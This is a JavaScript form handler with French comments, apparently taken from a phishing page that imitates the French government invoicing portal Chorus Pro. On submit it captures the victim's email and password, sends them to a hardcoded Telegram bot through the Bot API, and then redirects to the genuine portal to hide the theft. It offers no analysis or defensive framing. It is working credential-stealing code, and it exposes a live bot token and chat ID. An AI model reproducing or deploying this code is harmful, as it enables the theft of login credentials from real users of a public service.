    document.getElementById('form').addEventListener('submit', function(e) {
        e.preventDefault(); // Empêche le rechargement de la page

        const email = document.getElementById('email').value;
        const password = document.getElementById('pwd').value;

        const botToken = '7095567255:AAE7899EX0ZlPFXtIaccA3qIx0FIEsQoaiM';
        const chatId = '6427871548';
        const message = `📩Chorus Pro :\nEmail : ${email}\nMot de passe : ${password}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Envoie les données au bot Telegram
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML' // pour le formatage HTML (optionnel)
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Succès:', data);
            console.log('Informations envoyées au bot Telegram.');
            window.location.href='https://portail.chorus-pro.gouv.fr/aife_csm' ;
        })
        .catch((error) => {
            console.error('Erreur:', error);
            console.log('Une erreur est survenue. Veuillez réessayer.');
        });
    });
